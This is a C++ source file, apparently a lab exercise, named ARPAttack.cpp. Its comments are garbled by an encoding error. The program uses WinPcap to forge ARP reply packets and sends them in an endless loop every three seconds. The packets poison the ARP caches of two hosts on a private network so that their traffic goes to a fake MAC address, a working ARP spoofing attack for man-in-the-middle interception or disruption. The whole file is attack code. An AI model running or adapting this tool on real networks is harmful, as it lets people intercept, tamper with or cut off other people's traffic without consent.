// ARPAttack.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"

#include "pcap.h"
#include "protocol.h"

#include <WinSock2.h>
#pragma comment(lib,"ws2_32.lib")

#pragma comment(lib,"wpcap.lib")
//����������VM8
pcap_t *init()
{
	pcap_if_t *alldevs;
	pcap_if_t *d;
	int inum;
	int i = 0;
	pcap_t *adhandle;
	char errbuf[PCAP_ERRBUF_SIZE];

	/*
	��ʾ�����豸�б�
	*/
	if (pcap_findalldevs(&alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}

	/*
	��ӡ�б�
	*/
	for (d = alldevs; d; d = d->next)
	{
		printf("%d. %s", ++i, d->name);
		if (d->description)
		{
			printf("(%s)\n", d->name);
		}
		else
		{
			printf("(no description available)\n");
		}
	}

	if (i == 0)
	{
		printf("\n no interfaces found! Make sure WinPcap is installed\n");
		return 0;
	}

	printf("Enter the interface number(1-%d):", i);
	scanf("%d",&inum);

	if (inum < 1 || inum > i)
	{
		printf("\nInterface number out of range\n");
		pcap_freealldevs(alldevs);
		return 0;
	}

	//����ѡ���������
	for (d = alldevs, i = 0; i < inum - 1; d = d->next, i++)
	{
	}
	//���豸��������
	if ((adhandle = pcap_open_live(d->name,
		65536,
		1,
		1000,
		errbuf)) == NULL)
	{
		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by winPcap\n");
		//�ͷ��豸�б�
		pcap_freealldevs(alldevs);
		return 0;
	}

	printf("\nlistening on %s ...\n", d->description);

	//�˿̲���Ҫ�κ��豸�б������ͷ�
	pcap_freealldevs(alldevs);
	return adhandle;
}

//���ַ�ת��16������
//�������12�ֽڵ�MAC�ַ�����ת��Ϊ6�ֽڵ�16����MAC��ַ
void ChangeMacAddr(char *p, UCHAR a[])
{
	char *p1 = NULL;
	int i = 0;
	int high, low;
	char temp[1];
	for (i = 0; i < 6; i++)
	{
		p1 = p + 1;
		switch (*p1)
		{
		//�����λ��16����
		case 'A':
			low = 10;
			break;
		case 'B':
			low = 11;
			break;
		case 'C':
			low = 12;
			break;
		case 'D':
			low = 13;
			break;
		case 'E':
			low = 14;
			break;
		case 'F':
			low = 15;
			break;
		default:
			temp[0] = *p1;
			//���Ϊ���־�ֱ��ת��ɶ�Ӧ����ֵ
			low = atoi(temp);
		}

		switch (*p)
		{
		//�����16����
		case 'A':
			high = 10;
			break;
		case 'B':
			high = 11;
			break;
		case 'C':
			high = 12;
			break;
		case 'D':
			high = 13;
			break;
		case 'E':
			high = 14;
			break;
		case 'F':
			high = 15;
			break;
		default:
			temp[0] = *p;
			//���Ϊ���־�ֱ��ת��ɶ�Ӧ����ֵ
			high = atoi(temp);
		}
		//ָ��ָ����һ��x���ߣ�x���ͣ��ַ���
		p += 2;
		//��16����ֵ
		a[i] = high * 16 + low;
	}
}

//����ARP��
void makeArpPacket(ARP_PACKET &ARPPacket, char * srcMac, char * srcIP, char * dstMac, char * dstIP)
{
	UCHAR MacAddr[6] = { 0 };

	//��̫��ͷ
	//Ŀ��MAC��ַ
	ChangeMacAddr(dstMac, ARPPacket.ehhdr.eh_dst);   
	//ԴMAC��ַ��
	ChangeMacAddr(srcMac, ARPPacket.ehhdr.eh_src);   
	//��������ARP�����Ӧ��
	ARPPacket.ehhdr.eh_type = htons(EPT_ARP);        

	//ARPͷ 
	//Ӳ����ַΪ0x0001��ʾ��̫����ַ
	ARPPacket.arphdr.arp_hrd = htons(ARP_HARDWARE);  
	//Э�������ֶ�Ϊ0x0800��ʾIP��ַ
	ARPPacket.arphdr.arp_pro = htons(EPT_IP);        
	//Ӳ����ַ���Ⱥ�Э���ַ���ȷֱ�ָ��Ӳ����ַ��Э���ַ�ĳ��ȣ�
	ARPPacket.arphdr.arp_hln = 6;                    
	//���ֽ�Ϊ��λ��������̫����IP��ַ��ARP�����Ӧ����˵�����ǵ�ֵ�ֱ�Ϊ6��4��
	ARPPacket.arphdr.arp_pln = 4;                    
	//ARP����ֵΪ1,ARPӦ��ֵΪ2,RARP����ֵΪ3,RARPӦ��ֵΪ4
	ARPPacket.arphdr.arp_op = htons(ARP_REPLY);      
	//���ͷ� ԴMAC��ַ����ƭ��MAC��ַ��
	ChangeMacAddr(srcMac, ARPPacket.arphdr.arp_sha); 
	//���ͷ� ԴIP��ַ ����ƭ��MAC��ַ��
	ARPPacket.arphdr.arp_spa = inet_addr(srcIP);     
	//Ŀ���MAC��ַ 
	ChangeMacAddr(dstMac, ARPPacket.arphdr.arp_tha); 
	//Ŀ���IP��ַ  
	ARPPacket.arphdr.arp_tpa = inet_addr(dstIP);     
}

//����ARP��
void sendArpPacket(pcap_t *fp, ARP_PACKET &ARPPacket)
{
	if (pcap_sendpacket(fp, (const u_char*)&ARPPacket, sizeof(ARPPacket)) != 0)
	{
		fprintf(stderr, "\nRrror sending the packet:%s\n", pcap_geterr(fp));
		return;
	}
}

int _tmain(int argc, _TCHAR* argv[])
{
	//1.��ʼ�����绷��
	pcap_t *adhandle = init();

	//2.������ݰ�
	ARP_PACKET ARPPacket_A = { 0 };
	ARP_PACKET ARPPacket_B = { 0 };

	makeArpPacket(ARPPacket_A, "123456789ABC", "192.168.43.110", "000C29B209FA", "192.168.43.100");
	makeArpPacket(ARPPacket_B, "123456789ABC", "192.168.43.100", "005056C00008", "192.168.43.110");

	while (true)
	{
		//3.�������ݰ�
		sendArpPacket(adhandle, ARPPacket_A);
		sendArpPacket(adhandle, ARPPacket_B);
		printf("send 0k!\n");
		Sleep(3000);
	}

	pcap_close(adhandle);
	return 0;
}

